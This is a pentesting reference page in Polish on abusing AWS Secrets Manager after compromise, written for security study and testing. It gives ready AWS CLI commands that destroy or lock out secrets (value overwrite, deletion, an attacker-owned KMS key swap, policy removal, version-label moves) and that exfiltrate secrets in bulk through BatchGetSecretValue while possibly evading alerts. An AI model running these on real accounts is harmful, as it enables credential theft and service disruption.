# AWS - Secrets Manager Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Aby uzyskać więcej informacji sprawdź:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Odczyt sekretów

The **secrets themselves are sensitive information**, [check the privesc page](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) to learn how to read them.

### DoS - zmiana wartości sekretu

Zmieniając wartość sekretu możesz **spowodować DoS we wszystkich systemach, które zależą od tej wartości.**

> [!WARNING]
> Zwróć uwagę, że poprzednie wartości również są przechowywane, więc łatwo jest po prostu wrócić do poprzedniej wartości.
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

Jeśli attacker ma uprawnienie secretsmanager:UpdateSecret, może skonfigurować secret tak, aby używał KMS key będącego własnością attackera. Klucz ten jest początkowo skonfigurowany w taki sposób, że każdy może uzyskać do niego dostęp i go używać, więc aktualizacja secret z nowym KMS key jest możliwa. Gdyby klucz nie był dostępny, secret nie mógłby zostać zaktualizowany.

Po zmianie KMS key dla secret, attacker modyfikuje konfigurację swojego klucza tak, by tylko on miał do niego dostęp. W ten sposób w kolejnych wersjach secret będzie szyfrowany nowym kluczem, a ponieważ nikt nie będzie miał do niego dostępu, możliwość odzyskania secret zostanie utracona.

Ważne jest, aby zauważyć, że ten brak dostępu wystąpi dopiero w późniejszych wersjach, po zmianie zawartości secret, ponieważ aktualna wersja jest wciąż zaszyfrowana oryginalnym KMS key.
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Deleting Secret

Minimalna liczba dni potrzebna do usunięcia secretu to 7
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
## secretsmanager:RestoreSecret

Możliwe jest przywrócenie sekretu, co pozwala na odzyskanie sekretów, które zostały zaplanowane do usunięcia, ponieważ minimalny okres usuwania sekretów to 7 dni, a maksymalny to 30 dni. W połączeniu z uprawnieniem secretsmanager:GetSecretValue umożliwia to odzyskanie ich zawartości.

Aby odzyskać sekret, który jest w procesie usuwania, możesz użyć następującego polecenia:
```bash
aws secretsmanager restore-secret \
--secret-id <Secret_Name>
```
## secretsmanager:DeleteResourcePolicy

Ta akcja pozwala usunąć politykę zasobów, która kontroluje, kto może uzyskać dostęp do sekretu. Może to doprowadzić do DoS, jeśli polityka zasobów została skonfigurowana tak, aby umożliwiać dostęp określonej grupie użytkowników.

Aby usunąć politykę zasobów:
```bash
aws secretsmanager delete-resource-policy \
--secret-id <Secret_Name>
```
## secretsmanager:UpdateSecretVersionStage

Stany sekretu służą do zarządzania jego wersjami. AWSCURRENT oznacza aktywną wersję, której używają aplikacje, AWSPREVIOUS przechowuje poprzednią wersję, aby w razie potrzeby móc się cofnąć, a AWSPENDING jest używany w procesie rotacji do przygotowania i weryfikacji nowej wersji przed ustawieniem jej jako aktualnej.

Aplikacje zawsze odczytują wersję oznaczoną AWSCURRENT. Jeśli ktoś przeniesie tę etykietę na niewłaściwą wersję, aplikacje będą używać nieważnych poświadczeń i mogą przestać działać.

AWSPREVIOUS nie jest używany automatycznie. Jednak jeśli AWSCURRENT zostanie usunięty lub błędnie przypisany, może się wydawać, że wszystko nadal działa na poprzedniej wersji.
```bash
aws secretsmanager update-secret-version-stage \
--secret-id <your-secret-name-or-arn> \
--version-stage AWSCURRENT \
--move-to-version-id <target-version-id> \
--remove-from-version-id <previous-version-id>
```
{{#include ../../../../banners/hacktricks-training.md}}





### Mass Secret Exfiltration via BatchGetSecretValue (up to 20 per call)

Wykorzystaj API Secrets Manager BatchGetSecretValue, aby pobrać do 20 sekretów w jednym żądaniu. To może znacznie zmniejszyć liczbę wywołań API w porównaniu z iterowaniem GetSecretValue dla każdego sekretu. Jeśli używane są filters (tags/name), wymagane jest również uprawnienie ListSecrets. CloudTrail nadal rejestruje jedno zdarzenie GetSecretValue dla każdego sekretu pobranego w pakiecie.

Wymagane uprawnienia
- secretsmanager:BatchGetSecretValue
- secretsmanager:GetSecretValue dla każdego docelowego sekretu
- secretsmanager:ListSecrets jeśli używasz --filters
- kms:Decrypt na CMK używanych przez sekrety (jeśli nie używasz aws/secretsmanager)

> [!WARNING]
> Zwróć uwagę, że uprawnienie `secretsmanager:BatchGetSecretValue` samo w sobie nie wystarcza do pobrania sekretów — potrzebujesz także `secretsmanager:GetSecretValue` dla każdego sekretu, który chcesz pobrać.

Exfiltrate by explicit list
```bash
aws secretsmanager batch-get-secret-value \
--secret-id-list <secret1> <secret2> <secret3> \
--query 'SecretValues[].{Name:Name,Version:VersionId,Val:SecretString}'
```
Exfiltrate przez filtry (tag key/value lub name prefix)
```bash
# By tag key
aws secretsmanager batch-get-secret-value \
--filters Key=tag-key,Values=env \
--max-results 20 \
--query 'SecretValues[].{Name:Name,Val:SecretString}'

# By tag value
aws secretsmanager batch-get-secret-value \
--filters Key=tag-value,Values=prod \
--max-results 20

# By name prefix
aws secretsmanager batch-get-secret-value \
--filters Key=name,Values=MyApp
```
Obsługa częściowych niepowodzeń
```bash
# Inspect the Errors list for AccessDenied/NotFound and retry/adjust filters
aws secretsmanager batch-get-secret-value --secret-id-list <id1> <id2> <id3>
```
Wpływ
- Szybkie „smash-and-grab” wielu sekretów przy mniejszej liczbie wywołań API, potencjalnie omijające alerty skonfigurowane na wykrywanie skoków GetSecretValue.
- Logi CloudTrail nadal zawierają jedno zdarzenie GetSecretValue na każdy sekret pobrany w ramach partii.
